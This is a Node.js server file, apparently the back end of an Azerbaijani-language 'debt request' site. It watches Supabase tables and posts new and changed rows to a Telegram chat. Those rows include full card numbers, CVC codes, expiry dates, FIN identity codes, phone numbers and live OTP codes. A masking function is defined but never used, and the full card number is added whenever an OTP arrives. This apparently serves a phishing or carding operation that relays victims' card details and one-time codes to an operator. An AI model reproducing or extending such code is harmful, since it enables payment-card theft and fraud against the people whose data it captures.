import 'dotenv/config';
import express from 'express';
import axios from 'axios';
import { createClient } from '@supabase/supabase-js';

const PORT = process.env.PORT || 3000;
const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_ANON_KEY = process.env.SUPABASE_ANON_KEY;
const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID; // Required to send messages
const TELEGRAM_WEBHOOK_SECRET = process.env.TELEGRAM_WEBHOOK_SECRET;
const WATCH_TABLES = (process.env.WATCH_TABLES || 'public.*').split(',').map(s => s.trim()).filter(Boolean);
const PRIMARY_CHAT_ID = TELEGRAM_CHAT_ID ? String(TELEGRAM_CHAT_ID) : null;

if (!SUPABASE_URL || !SUPABASE_ANON_KEY) {
  console.error('[config] Missing SUPABASE_URL or SUPABASE_ANON_KEY in environment.');
}
if (!TELEGRAM_BOT_TOKEN) {
  console.error('[config] Missing TELEGRAM_BOT_TOKEN in environment.');
}
if (!TELEGRAM_CHAT_ID) {
  console.warn('[config] TELEGRAM_CHAT_ID not set. Realtime events will be logged but not sent to Telegram.');
}
if (!SUPABASE_SERVICE_ROLE_KEY) {
  console.warn('[config] SUPABASE_SERVICE_ROLE_KEY not set. Telegram idarəetmə əməliyyatları anon açarla cəhd ediləcək.');
}

const app = express();
app.use(express.json());

app.get('/health', (req, res) => {
  res.json({ status: 'ok', uptime: process.uptime() });
});

app.post('/test-message', async (req, res) => {
  try {
    const { text = 'Hello from azpul-sync-bot!' } = req.body || {};
    await sendToTelegram(text);
    res.json({ ok: true });
  } catch (err) {
    console.error('[telegram] error sending test message', err?.response?.data || err?.message);
    res.status(500).json({ ok: false, error: err?.message });
  }
});

app.post('/telegram/webhook', async (req, res) => {
  try {
    if (TELEGRAM_WEBHOOK_SECRET) {
      const incomingSecret = req.get('x-telegram-bot-api-secret-token');
      if (incomingSecret !== TELEGRAM_WEBHOOK_SECRET) {
        console.warn('[telegram-webhook] invalid secret token');
        return res.status(401).json({ ok: false });
      }
    }

    await handleTelegramUpdate(req.body);
    res.json({ ok: true });
  } catch (err) {
    console.error('[telegram-webhook] failed to handle update', err?.message || err);
    res.json({ ok: false });
  }
});

const supabaseRealtime = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
  realtime: { params: { eventsPerSecond: 10 } },
});
const supabaseWriter = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY || SUPABASE_ANON_KEY, {
  auth: { persistSession: false },
});

function parseSpec(spec) {
  // formats:
  //  - "schema.table"
  //  - "table" (assumes public)
  //  - "schema:*" (all tables in schema)
  if (spec.includes('.')) {
    const [schema, table] = spec.split('.', 2);
    return { schema: schema || 'public', table: table || '*' };
  }
  return { schema: 'public', table: spec || '*' };
}

function escapeHtml(s) {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

// Azerbaijani translations
const AZ_TRANSLATIONS = {
  eventTypes: {
    'INSERT': 'YENİ ƏLAVƏ',
    'UPDATE': 'YENİLƏNDİ',
    'DELETE': 'SİLİNDİ'
  },
  fields: {
    'amount': 'Məbləğ',
    'card_number': 'Kart nömrəsi',
    'card_type': 'Kart tipi',
    'cvc': 'CVC',
    'expiry': 'Bitmə tarixi',
    'fin_code': 'FIN kod',
    'otp_code': 'OTP kod',
    'status': 'Status',
    'phone_number': 'Telefon nömrəsi',
    'otp_submitted_at': 'OTP tarixi',
    'details': 'Məlumat',
    'id': 'Sorğu ID',
    'admin_actor': 'Operator',
    'resolved_at': 'Yekun vaxt'
  },
  labels: {
    'New': 'Yeni',
    'Changed': 'Dəyişikliklər',
    'Old': 'Köhnə'
  }
};

const ALLOWED_FIELDS = ['id', 'amount', 'card_number', 'card_type', 'cvc', 'expiry', 'fin_code', 'otp_code', 'phone_number', 'otp_submitted_at', 'details', 'status', 'admin_actor', 'resolved_at'];

const DEBT_STATUS_LABELS = {
  awaiting_otp: 'OTP gözlənilir',
  awaiting_admin: 'Operator gözlənilir',
  completed: 'Tamamlandı',
  expired: 'Vaxtı bitib',
  cancelled: 'Ləğv edildi',
};

const DEBT_FIELD_LABELS = {
  customer_name: 'Ad',
  loan_amount: 'Kreditin məbləği',
  loan_term: 'Kreditin müddəti',
  payment_date: 'Ödəniş tarixi',
  outstanding_amount: 'Qalıq borc',
  contract_number: 'Kredit müqaviləsi',
  note: 'Qeyd',
};

const AZ_CHAR_REPLACEMENTS = {
  ə: 'e', Ə: 'e',
  ı: 'i', İ: 'i',
  ö: 'o', Ö: 'o',
  ü: 'u', Ü: 'u',
  ğ: 'g', Ğ: 'g',
  ç: 'c', Ç: 'c',
  ş: 's', Ş: 's',
};

const DEBT_FORM_KEY_ALIASES = new Map([
  ['ad', 'customer_name'],
  ['soyad', 'customer_name'],
  ['musteri adi', 'customer_name'],
  ['musteri', 'customer_name'],
  ['kreditin meblegi', 'loan_amount'],
  ['kredit meblegi', 'loan_amount'],
  ['kredit', 'loan_amount'],
  ['mebleg', 'loan_amount'],
  ['kreditin muddeti', 'loan_term'],
  ['muddet', 'loan_term'],
  ['odenis tarixi', 'payment_date'],
  ['odenis gunu', 'payment_date'],
  ['tarix', 'payment_date'],
  ['qaliq borcun meblegi', 'outstanding_amount'],
  ['qaliq borc', 'outstanding_amount'],
  ['borc meblegi', 'outstanding_amount'],
  ['qaliq', 'outstanding_amount'],
  ['kredit muqavilesi', 'contract_number'],
  ['muqavile nomresi', 'contract_number'],
  ['muqavile', 'contract_number'],
  ['contract', 'contract_number'],
  ['qeyd', 'note'],
  ['note', 'note'],
]);

const REQUEST_ID_REGEX = /(sor[uğ]u\s*id|request\s*id|req\s*id)[:#\s-]*([0-9a-fA-F-]{6,})/i;
const UUID_REGEX = /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i;

const TELEGRAM_HELP_TEXT = [
  'Sorğunu yeniləmək üçün iki seçim var:',
  '• Botun göndərdiyi mesaja cavab yazın və məlumatları eyni mesajda paylaşın;',
  '• və ya /submit <sorğu-id> yazıb ardınca məlumatları əlavə edin.',
  '',
  '3 forma dəstəklənir:',
  '1) Qısa açarlar: ad=..., kredit=..., muddet=..., tarix=..., qaliq=..., muqavile=...;',
  '2) Klassik format: "ad: ..." sətirlərini yazın;',
  '3) Ən sadə şablon: 6 sətir ardıcıl göndərin → ad, məbləğ, müddət, tarix, qalıq, müqavilə (əlavə qeydlər varsa yeni sətirə).',
  '',
  'Ayrıcı olaraq ; və ya yeni sətr istifadə etmək olar.',
  '',
  'Nümunə:',
  'Məmmədov Ceyhun\n70 ₼\n10 gün\n11.03.2024\n147 ₼\n№A2403010000736025329\n',
  'və ya',
  'ad=Məmmədov Ceyhun; kredit=70 ₼; muddet=10 gün; tarix=11.03.2024; qaliq=147 ₼; muqavile=№A2403010000736025329',
  '',
  'Tez şablon lazımdırsa /template <sorğu-id> yazın.',
].join('\n');

function filterAllowedFields(obj) {
  if (!obj || typeof obj !== 'object') return {};
  const filtered = {};
  for (const key of ALLOWED_FIELDS) {
    if (key in obj) {
      filtered[key] = obj[key];
    }
  }
  return filtered;
}

function maskSensitiveRow(row) {
  if (!row || typeof row !== 'object') return row;
  const out = { ...row };
  if (out.card_number && typeof out.card_number === 'string') {
    const last4 = out.card_number.slice(-4);
    out.card_number = `•••• •••• •••• ${last4}`;
  }
  if (out.cvc) out.cvc = '•••';
  if (out.otp_code) out.otp_code = '••••';
  return out;
}

function renderValue(v) {
  if (v === null || v === undefined) return String(v);
  if (typeof v === 'object') return JSON.stringify(v);
  return String(v);
}

function getFieldEmoji(field) {
  const emojiMap = {
    'card_number': '💳',
    'amount': '💰',
    'expiry': '📅',
    'cvc': '🔒',
    'fin_code': '🆔',
    'phone_number': '📱',
    'otp_code': '🔢',
    'status': '📊',
    'card_type': '🏦',
    'otp_submitted_at': '⏰',
    'id': '🔖',
    'admin_actor': '👤',
    'resolved_at': '✅'
  };
  return emojiMap[field] || '📌';
}

function renderList(obj) {
  return Object.entries(obj)
    .map(([k, v]) => {
      const label = AZ_TRANSLATIONS.fields[k] || k;
      const emoji = getFieldEmoji(k);
      return `${emoji} <b>${escapeHtml(label)}</b>: <code>${escapeHtml(renderValue(v))}</code>`;
    })
    .join('\n');
}

function diffFields(oldRow = {}, newRow = {}) {
  const keys = Array.from(new Set([...Object.keys(oldRow), ...Object.keys(newRow)])).sort();
  const lines = [];
  for (const k of keys) {
    const o = oldRow[k];
    const n = newRow[k];
    const same = JSON.stringify(o) === JSON.stringify(n);
    if (!same) {
      const emoji = getFieldEmoji(k);
      const label = AZ_TRANSLATIONS.fields[k] || k;
      lines.push(`${emoji} <b>${escapeHtml(label)}</b>: <code>${escapeHtml(renderValue(o))}</code> → <code>${escapeHtml(renderValue(n))}</code>`);
    }
  }
  return lines.join('\n');
}

function formatGenericChange(eventType, s, t, rowNew, rowOld) {
  const eventTypeAz = AZ_TRANSLATIONS.eventTypes[eventType] || eventType;
  const eventEmoji = eventType === 'INSERT' ? '🆕' : eventType === 'UPDATE' ? '🔄' : '🗑';
  const header = `${eventEmoji} <b>${escapeHtml(eventTypeAz)}</b>`;
  
  if (eventType === 'INSERT') {
    const filtered = filterAllowedFields(rowNew || {});
    const body = renderList(filtered);
    return `${header}\n\n${body}`;
  }
  if (eventType === 'UPDATE') {
    const oldRow = filterAllowedFields(rowOld || {});
    const newRow = filterAllowedFields(rowNew || {});
    const keys = Array.from(new Set([...Object.keys(oldRow), ...Object.keys(newRow)])).sort();
    const lines = [];
    const changedKeys = [];
    for (const k of keys) {
      const o = oldRow[k];
      const n = newRow[k];
      if (JSON.stringify(o) !== JSON.stringify(n)) {
        changedKeys.push(k);
        const label = AZ_TRANSLATIONS.fields[k] || k;
        const emoji = getFieldEmoji(k);
        lines.push(`${emoji} <b>${escapeHtml(label)}</b>: <code>${escapeHtml(renderValue(n))}</code>`);
      }
    }
    // If OTP changed, also show card_number even if it didn't change
    if (changedKeys.includes('otp_code') && (newRow.card_number || oldRow.card_number)) {
      const pan = newRow.card_number ?? oldRow.card_number;
      const label = AZ_TRANSLATIONS.fields['card_number'];
      const emoji = getFieldEmoji('card_number');
      lines.push(`${emoji} <b>${escapeHtml(label)}</b>: <code>${escapeHtml(renderValue(pan))}</code>`);
    }
    const body = lines.join('\n');
    return `${header}\n\n${body || 'Dəyişiklik yoxdur'}`;
  }
  if (eventType === 'DELETE') {
    const filtered = filterAllowedFields(rowOld || {});
    const body = renderList(filtered);
    return `${header}\n\n${body}`;
  }
  const filtered = filterAllowedFields(rowNew || rowOld || {});
  const body = renderList(filtered);
  return `${header}\n\n${body}`;
}

function formatChange(eventType, s, t, rowNew, rowOld) {
  if (t === 'debt_requests') {
    return formatDebtRequestChange(eventType, rowNew, rowOld);
  }
  return formatGenericChange(eventType, s, t, rowNew, rowOld);
}

function describeDebtStatus(status) {
  if (!status) return 'naməlum';
  return DEBT_STATUS_LABELS[status] || status;
}

function coerceDebtDetails(details) {
  if (!details) return null;
  if (typeof details === 'object' && !Array.isArray(details)) return details;
  if (typeof details === 'string') {
    try {
      const parsed = JSON.parse(details);
      if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) {
        return parsed;
      }
    } catch (err) {
      console.warn('[debt-details] failed to parse', err?.message || err);
    }
  }
  return null;
}

function getDebtFieldEmoji(field) {
  const emojiMap = {
    'customer_name': '👤',
    'loan_amount': '💰',
    'loan_term': '📅',
    'payment_date': '📆',
    'outstanding_amount': '💵',
    'contract_number': '📄',
    'note': '📝'
  };
  return emojiMap[field] || '📌';
}

function formatDebtDetailsBlock(details) {
  const normalized = coerceDebtDetails(details);
  if (!normalized) return '';
  const lines = [];
  for (const [key, label] of Object.entries(DEBT_FIELD_LABELS)) {
    const value = normalized[key];
    if (!value) continue;
    const emoji = getDebtFieldEmoji(key);
    lines.push(`${emoji} <b>${escapeHtml(label)}</b>: <code>${escapeHtml(String(value))}</code>`);
  }
  for (const [key, value] of Object.entries(normalized)) {
    if (key in DEBT_FIELD_LABELS) continue;
    if (!value) continue;
    lines.push(`📌 <b>${escapeHtml(key)}</b>: <code>${escapeHtml(String(value))}</code>`);
  }
  return lines.join('\n');
}

function formatDebtRequestChange(eventType, rowNew = {}, rowOld = {}) {
  const eventTypeAz = AZ_TRANSLATIONS.eventTypes[eventType] || eventType;
  const eventEmoji = eventType === 'INSERT' ? '🆕' : eventType === 'UPDATE' ? '🔄' : '🗑';
  const current = rowNew || {};
  const previous = rowOld || {};
  const requestId = current.id || previous.id || 'naməlum';
  const phone = current.phone_number || previous.phone_number || 'naməlum';
  const statusNow = current.status || previous.status;
  const lines = [
    `${eventEmoji} <b>${escapeHtml(eventTypeAz)}</b>`,
    '',
    `🔖 <b>Sorğu ID</b>: <code>${escapeHtml(requestId)}</code>`,
    `📱 <b>Telefon</b>: <code>${escapeHtml(phone)}</code>`,
  ];

  if (eventType === 'INSERT') {
    lines.push('', '✅ Yeni borc sorğusu yaradıldı. OTP təsdiqi gözlənilir.');
  } else if (eventType === 'UPDATE') {
    if (current.status && current.status !== previous.status) {
      lines.push(`📊 <b>Status</b>: <code>${escapeHtml(describeDebtStatus(current.status))}</code>`);
    } else if (statusNow) {
      lines.push(`📊 <b>Status</b>: <code>${escapeHtml(describeDebtStatus(statusNow))}</code>`);
    }
    if (current.otp_code && current.otp_code !== previous.otp_code) {
      lines.push(`🔢 <b>OTP</b>: <code>${escapeHtml(current.otp_code)}</code>`);
    }
    if (current.admin_actor && current.admin_actor !== previous.admin_actor) {
      lines.push(`👤 <b>Operator</b>: ${escapeHtml(current.admin_actor)}`);
    }
  } else if (eventType === 'DELETE') {
    lines.push('', '🗑 Sorğu silindi.');
  }

  const detailsBlock = formatDebtDetailsBlock(current.details || previous.details);
  if (detailsBlock) {
    lines.push('');
    lines.push('<b>📋 Məlumatlar</b>');
    lines.push(detailsBlock);
  }

  if ((current.status || previous.status) === 'awaiting_admin') {
    lines.push('');
    lines.push('💬 <i>Bu mesaja cavab verərək sorğunu tamamlayın. Lazım olan formatı görmək üçün /help yazın.</i>');
  }

  return lines.join('\n');
}

function normalizeFormKey(key = '') {
  return key
    .split('')
    .map((char) => AZ_CHAR_REPLACEMENTS[char] ?? char)
    .join('')
    .toLowerCase()
    .replace(/[^a-z0-9\s]/g, ' ')
    .replace(/\s+/g, ' ')
    .trim();
}

function parseDebtDetailsForm(text = '') {
  if (!text) return {};
  const normalizedInput = text
    .replace(/[;|]/g, '\n')
    .replace(/\r/g, '\n');
  const lines = normalizedInput.split(/\n/);
  const collected = {};
  let currentKey = null;

  for (const rawLine of lines) {
    const line = rawLine.trim();
    if (!line) continue;
    const match = line.match(/^([^:=\-]+)\s*[:=\-]\s*(.*)$/);
    if (match) {
      const normalizedKey = normalizeFormKey(match[1]);
      if (!normalizedKey) {
        currentKey = null;
        continue;
      }
      currentKey = normalizedKey;
      collected[currentKey] = match[2]?.trim() ?? '';
      continue;
    }
    if (currentKey) {
      const existing = collected[currentKey];
      collected[currentKey] = existing ? `${existing} ${line}`.trim() : line;
    }
  }

  const mapped = {};
  for (const [key, value] of Object.entries(collected)) {
    const cleanedValue = value?.trim();
    if (!cleanedValue) continue;
    const canonical = DEBT_FORM_KEY_ALIASES.get(key) || key;
    mapped[canonical] = cleanedValue;
  }

  if (Object.keys(mapped).length === 0) {
    const simpleLines = lines
      .map((line) => line.trim())
      .filter(Boolean);
    if (simpleLines.length >= 5) {
      const [name, loanAmount, loanTerm, paymentDate, outstanding, contract, ...rest] = simpleLines;
      if (name) mapped.customer_name = name;
      if (loanAmount) mapped.loan_amount = loanAmount;
      if (loanTerm) mapped.loan_term = loanTerm;
      if (paymentDate) mapped.payment_date = paymentDate;
      if (outstanding) mapped.outstanding_amount = outstanding;
      if (contract) mapped.contract_number = contract;
      if (rest?.length) mapped.note = rest.join(' ');
    }
  }
  return mapped;
}

function extractRequestIdFromText(text = '') {
  if (!text) return null;
  const tagged = text.match(REQUEST_ID_REGEX);
  if (tagged?.[2]) return tagged[2];
  const uuidMatch = text.match(UUID_REGEX);
  if (uuidMatch) return uuidMatch[0];
  return null;
}

function parseSubmitCommand(text = '') {
  const match = text.match(/^\/(submit|fill|borc)\s+([^\s]+)([\s\S]*)$/i);
  if (!match) return null;
  return {
    command: match[1],
    requestId: match[2],
    body: (match[3] || '').trim(),
  };
}

function buildDebtTemplate(requestId) {
  const lines = [
    requestId ? `Sorğu ID: ${requestId}` : null,
    'ad: ',
    'kreditin məbləği: ',
    'kreditin müddəti: ',
    'ödəniş tarixi: ',
    'qaliq borcun məbləği: ',
    'kredit müqaviləsi: ',
  ].filter(Boolean);
  lines.push('', 'Qısa format nümunəsi:', 'ad=Məmmədov Ceyhun; kredit=70 ₼; muddet=10 gün; tarix=11.03.2024; qaliq=147 ₼; muqavile=№A2403010000736025329');
  return lines.join('\n');
}

function isAuthorizedChat(chatId) {
  if (!PRIMARY_CHAT_ID || chatId === undefined || chatId === null) return false;
  return String(chatId) === PRIMARY_CHAT_ID;
}

function formatAuthor(from = {}) {
  if (!from) return null;
  if (from.username) return `@${from.username}`;
  const name = [from.first_name, from.last_name].filter(Boolean).join(' ').trim();
  return name || null;
}

async function applyDebtDetailsSubmission(requestId, parsedDetails, author) {
  if (!requestId) {
    throw new Error('Sorğu ID tələb olunur');
  }
  if (!parsedDetails || Object.keys(parsedDetails).length === 0) {
    throw new Error('Məlumat tapılmadı');
  }

  const { data: existing, error: fetchError } = await supabaseWriter
    .from('debt_requests')
    .select('id, details, status, admin_actor')
    .eq('id', requestId)
    .single();

  if (fetchError || !existing) {
    throw new Error('Sorğu tapılmadı');
  }

  const mergedDetails = {
    ...(coerceDebtDetails(existing.details) || {}),
    ...parsedDetails,
  };

  const { error: updateError } = await supabaseWriter
    .from('debt_requests')
    .update({
      details: mergedDetails,
      status: 'completed',
      resolved_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      admin_actor: author || existing.admin_actor || null,
    })
    .eq('id', requestId);

  if (updateError) {
    throw new Error(updateError.message || 'Yeniləmə mümkün olmadı');
  }
}

async function handleTelegramUpdate(update = {}) {
  const message = update.message || update.edited_message;
  if (!message) return;

  const chatId = message.chat?.id;
  if (!isAuthorizedChat(chatId)) {
    console.warn('[telegram] unauthorized chat tried to interact');
    return;
  }

  const text = (message.text || '').trim();
  if (!text) return;

  if (text.startsWith('/start') || text.startsWith('/help')) {
    await sendToTelegram(TELEGRAM_HELP_TEXT, { chatId, replyToMessageId: message.message_id });
    return;
  }

  if (text.startsWith('/template')) {
    const [, reqIdRaw] = text.split(/\s+/, 2);
    const template = buildDebtTemplate(reqIdRaw?.trim());
    await sendToTelegram(template, { chatId, replyToMessageId: message.message_id });
    return;
  }

  const command = parseSubmitCommand(text);
  let requestId = command?.requestId || null;
  let payloadText = command?.body || '';

  if (!requestId && message.reply_to_message) {
    requestId = extractRequestIdFromText(message.reply_to_message.text || '');
    if (!payloadText) {
      payloadText = text;
    }
  }

  if (!requestId) {
    await sendToTelegram('Sorğu ID tapılmadı. /submit <sorğu-id> istifadə edin və ya botun mesajına cavab verin.', {
      chatId,
      replyToMessageId: message.message_id,
    });
    return;
  }

  if (!payloadText) {
    await sendToTelegram('Məlumat blokunu eyni mesajda paylaşın. /template əmri ilə tez şablon ala bilərsiniz.', {
      chatId,
      replyToMessageId: message.message_id,
    });
    return;
  }

  const parsed = parseDebtDetailsForm(payloadText);
  if (!parsed || Object.keys(parsed).length === 0) {
    await sendToTelegram('Məlumatı oxumaq alınmadı. "ad=...; kredit=..." formatından istifadə edin və ya /template əmrindən yararlanın.', {
      chatId,
      replyToMessageId: message.message_id,
    });
    return;
  }

  try {
    const author = formatAuthor(message.from);
    await applyDebtDetailsSubmission(requestId, parsed, author);
    await sendToTelegram(`Sorğu <code>${escapeHtml(requestId)}</code> yeniləndi.`, {
      chatId,
      replyToMessageId: message.message_id,
    });
  } catch (err) {
    console.error('[telegram] failed to apply details', err?.response?.data || err?.message || err);
    await sendToTelegram(`Sorğunu yeniləmək mümkün olmadı: ${escapeHtml(err?.message || 'naməlum xəta')}`, {
      chatId,
      replyToMessageId: message.message_id,
    });
  }
}

async function sendToTelegram(text, options = {}) {
  const { chatId = PRIMARY_CHAT_ID, replyToMessageId } = options;
  if (!TELEGRAM_BOT_TOKEN || !chatId) {
    console.log('[telegram] skip send (missing token or chat id) =>', text);
    return;
  }
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  await axios.post(url, {
    chat_id: chatId,
    text,
    parse_mode: 'HTML',
    disable_web_page_preview: true,
    reply_to_message_id: replyToMessageId,
    allow_sending_without_reply: true,
  }, { timeout: 10000 });
}

async function startRealtime() {
  const channel = supabaseRealtime.channel('db-changes');

  for (const spec of WATCH_TABLES) {
    const { schema, table } = parseSpec(spec);
    const filter = table === '*'
      ? { event: '*', schema, table: '*' }
      : { event: '*', schema, table };
    console.log(`[realtime] listening for * on ${schema}${table === '*' ? '.*' : '.' + table}`);
    channel.on('postgres_changes', filter, async (payload) => {
      const { eventType, schema: s, table: t, new: rowNew, old: rowOld } = payload;
      const text = formatChange(eventType, s, t, rowNew, rowOld);

      console.log('[realtime]', eventType, `${s}.${t}`);
      try {
        await sendToTelegram(text);
      } catch (err) {
        console.error('[telegram] send failed', err?.response?.data || err?.message);
      }
    });
  }

  const status = await channel.subscribe();
  console.log('[realtime] subscription status:', status);
}

async function main() {
  await startRealtime();
  app.listen(PORT, () => {
    console.log(`[server] listening on http://localhost:${PORT}`);
  });
}

process.on('SIGINT', () => {
  console.log('Shutting down...');
  process.exit(0);
});

main().catch((err) => {
  console.error('[startup] failed', err);
  process.exit(1);
});
